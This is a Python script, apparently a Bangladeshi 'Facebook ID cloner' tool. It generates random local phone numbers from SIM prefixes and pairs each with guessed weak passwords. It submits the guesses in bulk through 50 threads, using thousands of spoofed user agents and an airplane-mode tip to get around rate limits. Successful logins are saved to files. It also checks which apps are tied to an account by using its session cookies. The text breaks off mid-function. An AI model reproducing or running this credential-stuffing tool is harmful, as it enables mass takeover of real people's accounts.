#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python4
#FUCKED BY RMX [RIDOY-404-CYBER]
#JAHIDUL TERA PAPPA [RMX]
#---------------------[IMPORT]---------------------#
from os import path
import os,base64,zlib,pip,urllib
print('\n\033[1;37m install modules....\n It will take some seconds...JAR   W8 update Tool..')
#os.system('xdg-open https://youtube.com/channel/UCRedHPu_qhEpO9aLttjRKrg')
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
A = '\x1b[1;97m' 
#B = '\x1b[1;96m' 
BLACK = '\x1b[1;90m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
WW = '\033[97;1m' 
RR = '\033[91;1m' 
GG = '\033[92;1m' 
YY = '\033[93;1m' 
BB = '\033[94;1m'
PP = '\033[95;1m'
CC = '\033[96;1m'
NN = '\x1b[0m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
#HBF = '{ HBF }'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

ok = []
mnum=[]
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)


for sat in range(1000):
	a='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)

nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]


def uaku():
    try:
        ff=open('show.txt','r').read().splitlines()
        for ub in ff:
            ugen.append(ub)
    except:
        a=requests.get('https://raw.githubusercontent.com/Dark-Cyber-07/BLACK_XXX/main/show.txt').text
        ff=open('show.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ff.write(un+'\n')
        ff=open('show.txt','r').read().splitlines()
def jalan(z):

    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        
        
        
        
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        
os.system("clear")
import requests,os
fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m]ENTER YOUR NAME :\033[1;97m "))
name=fuckx.upper()
print ('')
psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mWELCOME MY TOOLS  '+name)
print('')
print('\033[1;93mTOOLS UPDATE SUCCESSFUL ')
print('')
jalan('\033[1;97mLOADING\033[1;32m.\033[1;35m.\033[1;34m.\033[1;97m.\033[1;33m.\033[38;5;196m.\033[1;35m.\033[1;34m.\033[1;33m.\033[1;32m.\033[1;97m.\033[38;5;196m.\033[38;5;46m.\033[38;5;196m.\033[1;32m.\033[1;97m.\033[1;35m.\033[1;34m.\033[1;33m.\033[38;5;46m.\033[1;97m.')
time.sleep(2)




loop = 0
cp = []
ok = []
uid = []

def clear():
    os.system('clear')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
def banner():
    clear()
    print(f"""\033[1;92m
\033[1;37m      ____        _       ________    
\033[1;92m     `MM'        dM.     `MMMMMMMb.  
\033[1;37m       MM       ,MMb       MM    `Mb  
\033[1;37m       MM      ,P `Mb      MM     MM  
\033[1;92m       MM      d'  YM.     MM    .M9  
\033[1;37m       MM     ,P   `Mb     MMMMMMM9'  
\033[1;92m       MM     d'    YM.    MM  \M\    
\033[1;37m (8)   MM    ,MMMMMMMMb    MM   \M\   
\033[1;92m ((   ,M9    d'      YM.   MM    \M\  
\033[1;37m  YMMMM9   _dM_     _dMM_  MM_    \M\_
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : Jahidul islam          │ 
\033[1;37m│ ❲★❳ GITHUB   : Jahidul404             |
\033[1;37m│ ❲★❳ WHATSAPP : +88 01701707661        │
\033[1;37m│ ❲★❳ TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m       │
\033[1;37m│ ❲★❳ VERSION  : \033[1;35m 4\033[1;35mK \033[1;32mPREMIUM  \033[1;37m          │
\033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┘""")
#---------------------[LOOP MENU]---------------------#
loop = 0
ok = []
uid = []

#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s{P}[%s×%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'[🔥] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'[✔] %s ☑ Your Expired Apps ☑    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print("%s═════════════════════%s═════════════════════%s"%(M,H,P))


#---------------------[MAIN MENU]---------------------#



#---------------------[MAIN CLONING DEF 2]---------------------#
def main():
    os.system('clear')
    banner()


    #ip = requests.get("https://api.ipify.org").text
    #jalan("\033[97;1m[\033[92;1m+\033[97;1m]\033[97;1mIP ADDRES \033[38;5;196m: \033[1;32m"+ip)
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(f"\033[1;97m[\033[92;1m1\033[1;97m]\033[1;97mRANDOM BD CLONE APK ")
    print(f"\033[1;97m[\033[92;1m2\033[1;97m]\033[1;97mRANDOM BD CLONE OKS ")
    print(f"\033[1;97m[\033[92;1m3\033[1;97m]\033[1;97mRANDOM BD CLONE MIX ")
    print(f"\033[1;97m[\033[92;1m4\033[1;97m]\033[1;97mRANDOM CLONING  Email ") 
    print(f"\033[1;97m[\033[92;1m5\033[1;97m]\033[1;97mRANDOM PK CLONE  ")
    print(f"\033[1;97m[\033[92;1m6\033[1;97m]\033[1;97mCONTACT TO ADMIN  ")
    print(f"\033[1;97m[\033[92;1m7\033[1;97m]\033[1;91mEXIT  ")
    print("")

    sh = input("\033[0;97m[\033[38;5;208m?\033[0;97m]\033[0;97mCHOOSE : ")
    if sh =='1':
       os.system(' ')
       random_apk()
    if sh =='2':
       os.system(' ')
       menu()
    if sh =='3':
       os.system(' ')
       random_MIX()
    if sh =='4':
       os.system(' ')
       random_gmail()
    if sh =='5':
       os.system(' ')
       menu()
    if sh =='6':
      # os.system('xdg-open https://www.facebook.com/profile.php?id=100000446995720')
     #  main()  

        
        
def menu():
	os.system('clear')
	banner()
	print('\x1b[97;1m[1] Crack random Clone Method 1')
	print('\x1b[97;1m[2] Crack random Clone Method 2')
	print('\x1b[97;1m[3] Crack random Clone Method 3')
	print(50*'_')
	opt = input('\x1b[97;1m[√] SELECT OPT: ')
	if opt =='1':
		random_number1()
	elif opt =='2':
		random_number2()
	elif opt =='3':
		random_number3()
	
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		menu()      
                
        
def random_apk():
	user=[]
	os.system('clear')
	banner()
	print(f"             {H} SIM {K}CODE{P}  ");time.sleep(0.05)
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	print(f"  {K}BD : \033[1;97m017 , 016 , 018 , 019 , 013") 
	print(f"  {K}PAK : \033[1;97m0349 , 0306 , 0302 , 0300 , 0315") 
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	kode = input(f'{M}    INPUT CODE {P}:{H} ')
	os.system("clear")
	banner()
	doamin = ' \033[1;92m(APK) '
	print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
	limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		banner()
		tl = str(len(user))
		print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;45m Bangladesh")
		print(f' {P}[{H}★{P}]{WHITE} AGENTS    : '+str(len(ugen)))
		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
		psb(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','বাংলাদেশ']
			yaari.submit(apk,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()        
        
def random_MIX():
	user=[]
	os.system('clear')
	banner()
	print(f"             {H} SIM {K}CODE{P}  ");time.sleep(0.05)
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	print(f"  {K}BD : \033[1;97m017 , 016 , 018 , 019 , 013") 
	print(f"  {K}PAK : \033[1;97m0349 , 0306 , 0302 , 0300 , 0315") 
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	kode = input(f'{M}    INPUT CODE {P}:{H} ')
	os.system("clear")
	banner()
	doamin = ' \033[1;92m[MIX] '
	print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
	limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		banner()
		tl = str(len(user))
		print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;45m Bangladesh")
		print(f' {P}[{H}★{P}]{WHITE} AGENTS    : '+str(len(ugen)))
		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
		psb(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','বাংলাদেশ']
			yaari.submit(mix,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()        
        
        
    
def random_number1():
	user=[]
	os.system('clear')
	banner()
	print(f"             {H} SIM {K}CODE{P}  ");time.sleep(0.05)
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	print(f"  {K}BD : \033[1;97m017 , 016 , 018 , 019 , 013") 
	print(f"  {K}PAK : \033[1;97m0349 , 0306 , 0302 , 0300 , 0315") 
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	kode = input(f'{M}    INPUT CODE {P}:{H} ')
	os.system("clear")
	banner()
	doamin = ' \033[1;92mMETHUD 1 '
	print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
	limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		banner()
		tl = str(len(user))
		print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;45m Bangladesh")
		print(f' {P}[{H}★{P}]{WHITE} AGENTS    : '+str(len(ugen)))
		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
		psb(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','বাংলাদেশ']
			yaari.submit(fcrack1,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()
    
def random_number2():
	user=[]
	os.system('clear')
	banner()
	print(f"             {H} SIM {K}CODE{P}  ");time.sleep(0.05)
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	print(f"  {K}BD : \033[1;97m017 , 016 , 018 , 019 , 013") 
	print(f"  {K}PAK : \033[1;97m0349 , 0306 , 0302 , 0300 , 0315") 
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	kode = input(f'{M}    INPUT CODE {P}:{H} ')
	os.system("clear")
	banner()
	doamin = ' \033[1;92mMETHUD 2 '
	print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
	limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		banner()
		tl = str(len(user))
		print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;45m Bangladesh")
